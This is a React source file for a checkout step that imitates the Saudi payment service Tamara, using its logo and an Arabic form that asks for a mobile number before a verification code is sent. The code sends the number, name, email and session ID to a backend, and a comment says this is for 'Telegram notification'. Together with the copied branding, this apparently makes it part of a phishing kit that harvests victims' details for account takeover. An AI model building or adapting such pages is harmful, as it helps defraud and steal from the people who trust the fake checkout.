import { toEnglishNumbers } from '@/lib/utils';
import { useState } from 'react';
import { submitPhoneNumber } from '@/lib/api';
import { getCheckoutSessionId } from '@/lib/checkoutSession';

interface ConfirmMethodProps {
  phoneNumber: string;
  setPhoneNumber: (value: string) => void;
  userName: string;
  userEmail: string;
  onBack: () => void;
  onSubmit: () => void;
}

const ConfirmMethod = ({ phoneNumber, setPhoneNumber, userName, userEmail, onBack, onSubmit }: ConfirmMethodProps) => {
  const [error, setError] = useState<string | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);

  // SIMPLIFIED - Just check if starts with 5
  const isValid = phoneNumber.startsWith('5');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!phoneNumber.startsWith('5')) {
      setError('يجب أن يبدأ الرقم بـ 5');
      return;
    }

    setIsSubmitting(true);
    setError(null);

    try {
      const sessionId = getCheckoutSessionId();
      const cleanPhone = toEnglishNumbers(phoneNumber.trim());
      
      // Submit phone number to backend for validation and Telegram notification
      await submitPhoneNumber({
        sessionId,
        phoneNumber: cleanPhone,
        userName,
        userEmail,
      });

      // If successful, proceed to the next step
      onSubmit();
    } catch (err: any) {
      console.error('Failed to submit phone number:', err);
      setError(err.message || 'فشل في إرسال رقم الهاتف. يرجى المحاولة مرة أخرى.');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col px-6 py-8">
      {/* Header */}
      <div className="flex justify-between items-center mb-8">
        {/* Tamara Logo - Right */}
        <svg
          xmlns="http://www.w3.org/2000/svg"
          width="60"
          height="30"
          fill="none"
          viewBox="0 0 44 19"
          className="tamara-svg-icon__svg"
          style={{ color: '#000000' }}
        >
          <g fill="currentColor" clipPath="url(#n62ibrfvh9o__a)">
            <path d="M5.004 7.674c-.16 0-.394.165-.478.32-.255.487-.44 1.008-.685 1.5-.132.263-.072.419.116.628.502.562 1.023 1.12 1.44 1.748.498.748.43 1.546-.205 2.172a6.281 6.281 0 0 1-1.656 1.19c-.878.417-1.828.68-2.74 1.034-.125.048-.322.213-.338.32-.053.338.134.439.26.493 1.049.456 2.115.877 3.22 1.329.356-.538.717-1.039 1.031-1.567 1.697-2.853 2.07-5.793.512-8.832-.082-.16-.311-.332-.477-.335Zm37.593-3.698-.037-.037a1.293 1.293 0 0 0-2.11 1.412c.065.158.16.3.28.42l.038.039c.731.732 1.551.279 1.83 0a1.296 1.296 0 0 0 0-1.834Zm-5.379.051a1.37 1.37 0 0 0-.299.448l1.963 1.705c.1-.058.192-.13.273-.21l.04-.04c.776-.778.296-1.646 0-1.944a1.371 1.371 0 0 0-1.938 0l-.04.041ZM8.072 3.15s-.485 1.006-.703 1.521c-.094.214-.14.446-.136.68.08 1.793.152 3.589.284 5.378.134 1.823 1.03 3.154 2.714 3.923 1.178.537 2.423.781 3.702.855 1.612.093 3.228.14 4.841.154 2.683.023 5.345-.168 7.972-.696.81-.106 3.34-.762 3.78-1.001.494-.27.461-.205.96-.079 1.207.307 4.396.231 5.314-.04.614-.182 1.175-.328 1.313-.75.564.89.879 1.343 1.85 1.255.973-.087 1.054-.135 2.007-.347.795-.177 1.381-.691 1.62-1.468.148-.481.129-.711.17-1.069.148-1.271-.05-2.477-.78-3.546-.12-.172-.195-.343-.61-.316-.13.008-.323.202-.403.358-.241.474-.423.978-.663 1.457-.134.269-.073.459.137.653.447.41.859.818 1.417 1.384-1.066.112-1.432.227-2.35.299-.918.072-2.6.058-3.073-.777-.346-.61-.569-1.03-1.13-1.446-.935-.693-2.447-.689-3.71-.036-.57.292-1.172.874-1.27 1.554-.043.306-.148.559-.492.647-5.233 1.348-11.366 1.977-16.518 1.4-1.312-.148-2.617-.365-3.855-.85-1.108-.433-1.608-1.2-1.588-2.4.037-2.21.014-4.42 0-6.63a.428.428 0 0 0-.403-.467c-.17-.015-.397.4-.397.4Zm28.3 9.177-4.282-.052s.317-1.695 2.059-1.76c2.506-.091 2.221 1.812 2.221 1.812h.002Z"></path>
            <path d="M2.212 3.354a.427.427 0 0 0-.406-.466c-.174-.015-.398.398-.398.398S.924 4.294.706 4.808c-.094.214-.14.446-.136.68.04.881.077 1.762.121 2.643l.177 3.758c.037.769.08 1.538.12 2.324h.711c.175-.874.477-1.738.497-2.606.024-1.169.023-6.67.016-8.253Z"></path>
          </g>
          <defs>
            <clipPath id="n62ibrfvh9o__a"><path fill="#fff" d="M.449.5H44v18H.449z"></path></clipPath>
          </defs>
        </svg>

        {/* Right side - Language and Close */}
        <div className="flex items-center gap-2.5">
          <span
            className="cursor-pointer text-sm"
            style={{ color: '#555' }}
          >
            English
          </span>
          <span
            onClick={onBack}
            className="cursor-pointer text-2xl"
            style={{ color: '#444' }}
          >
            &times;
          </span>
        </div>
      </div>

      {/* Main Content */}
      <div className="max-w-sm mx-auto w-full">
        <h2
          className="text-2xl font-bold mb-2 text-right"
          style={{ color: '#000' }}
        >
          أدخل رقم الجوال
        </h2>
        <p
          className="mb-7 text-sm text-right"
          style={{ color: '#666' }}
        >
          سيتم إرسال رمز تحقق للمتابعة
        </p>

        <form onSubmit={handleSubmit}>
          <div className="mb-5">
            <label
              htmlFor="phone"
              className="block mb-2 text-sm text-right"
              style={{ color: '#333' }}
            >
              رقم الجوال
            </label>
            <div
              className="flex items-center rounded-xl overflow-hidden bg-white"
              style={{
                border: '1px solid #dcdcdc',
                flexDirection: 'row-reverse',
                height: '45px',
              }}
            >
              <input
                type="tel"
                id="phone"
                name="phone"
                value={phoneNumber}
                onChange={e => {
                  const value = toEnglishNumbers(e.target.value.replace(/\D/g, ''));
                  setPhoneNumber(value);
                }}
                placeholder="اكتب رقمك"
                inputMode="numeric"
                className="flex-1 px-3 outline-none"
                style={{
                  fontSize: '16px',
                  direction: 'ltr',
                  height: '100%',
                  color: '#000000'
                }}
              />
              <div
                className="flex items-center gap-1.5 px-3"
                style={{
                  backgroundColor: '#f7f7f7',
                  borderRight: '1px solid #ddd',
                  height: '100%',
                  fontSize: '16px'
                }}
              >
                <span style={{ color: '#000000' }}>+966</span>
                <img
                  src="https://flagcdn.com/w20/sa.png"
                  alt="SA Flag"
                  style={{
                    width: '22px',
                    height: '15px',
                    borderRadius: '3px'
                  }}
                />
              </div>
            </div>
            {error && (
              <p className="text-red-500 text-xs mt-1 text-right">
                {error}
              </p>
            )}
          </div>

          <button
            type="submit"
            id="sendBtn"
            disabled={!isValid || isSubmitting}
            className="w-full py-3 font-semibold transition-colors"
            style={{
              fontSize: '16px',
              backgroundColor: isValid && !isSubmitting ? '#000' : '#ddd',
              color: isValid && !isSubmitting ? '#fff' : '#999',
              cursor: isValid && !isSubmitting ? 'pointer' : 'not-allowed',
              border: 'none',
              borderRadius: '30px'
            }}
          >
            {isSubmitting ? 'جاري الإرسال...' : 'أرسل الرمز'}
          </button>
        </form>
      </div>
    </div>
  );
};

export default ConfirmMethod;
